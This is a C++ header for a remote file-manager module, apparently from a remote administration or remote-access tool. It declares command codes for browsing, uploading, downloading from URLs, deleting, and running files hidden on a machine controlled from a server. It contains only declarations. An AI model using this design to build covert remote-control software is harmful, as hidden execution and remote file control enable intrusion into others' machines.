#pragma once
#include "MsgHandler.h"

#define FILE_MANAGER	('F'|('M'<<8)|('G')<<16|('R'<<24))

#define FILE_MGR_CHDIR			0x00a1
#define FILE_MGR_CHDIR_RET		0x00a2
//NewDir.
#define FILE_MGR_GETLIST		0x00a3
#define FILE_MGR_GETLIST_RET	0x00a4
//statu ,cur location,list

#define FILE_MGR_UP				0x00a5
#define FILE_MGR_REFRESH		0x01a6
#define FILE_MGR_SEARCH			0x01a7	

#define FILE_MGR_UPLOADFROMDISK	0x00a6
#define FILE_MGR_UPLOADFRURL	0x00a7
#define FILE_MGR_DOWNLOAD		0x00a8

#define FILE_MGR_RUNFILE_NORMAL	0x00a9
#define FILE_MGR_RUNFILE_HIDE	0x00aa

//
#define FILE_MGR_NEWFOLDER		0x00ab
#define FILE_MGR_RENAME			0x00ac
#define FILE_MGR_DELETE			0x00ad

#define FILE_MGR_COPY			0x00ae
#define FILE_MGR_CUT			0x00af
#define FILE_MGR_PASTE			0x00b0


#define FILE_MGR_NEW_FOLDER_SUCCESS		(0x1106)

#define FILE_MGR_ERROR					(0x1107)


class CModuleMgr;
class CManager;
class CFileManager:
	public CMsgHandler
{
	typedef void (*pModuleEntry)(char* szServerAddr,unsigned short uPort,DWORD dwParam);
private:

	typedef struct DriverInfo{
		WCHAR szName[128];
		WCHAR szTypeName[128];
		WCHAR szFileSystem[128];
		ULARGE_INTEGER	Total;
		ULARGE_INTEGER	Free;
		DWORD dwType;
	}DriverInfo;
	
	typedef struct FmFileInfo
	{
		DWORD dwFileAttribute;
		DWORD dwFileSizeLo;
		DWORD dwFileSizeHi;
		DWORD dwLastWriteLo;
		DWORD dwLastWriteHi;
		WCHAR szFileName[2];
	}FmFileInfo;

private:
	wchar_t*	m_pCurDir;			//??ǰĿ¼.
	//copy / cut
	wchar_t*	m_SrcPath;
	wchar_t*	m_FileList;
	DWORD		m_bMove;

	BOOL ChDir(const WCHAR* Dir);

	void SendDriverList();
	void SendFileList();
	//
	void NewFolder();
	void ReName();
	void DelFile();
	void CpFile();
	void MvFile();
	void Exec();					//Run 
	void ChAttribute();
	//
	void DownloadFromUrl();
	void DownloadFromSrv();
	void UploadToSrv();

	void OnClose();	
	void OnOpen();


	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer){}

	static void FMCpOrMvFile(WCHAR*szFileName, BOOL bIsDir, DWORD dwParam);

public:
	void OnChangeDir(char*Buffer);
	void OnGetCurList();
	void OnUp();
	void OnRefresh();
	void OnSearch();

	void OnUploadFromUrl(char*Buffer);
	void OnUploadFromDisk(char*Buffer);
	void OnDownload(char*buffer);
	void OnRunFile(DWORD Event, char*buffer);
	void OnNewFolder();
	void OnRename(char*buffer);
	void OnDelete(char*buffer);
	void OnCopy(char*buffer);
	void OnCut(char*buffer);
	void OnPaste(char*buffer);

	CFileManager(CManager*pManager);
	~CFileManager();
};

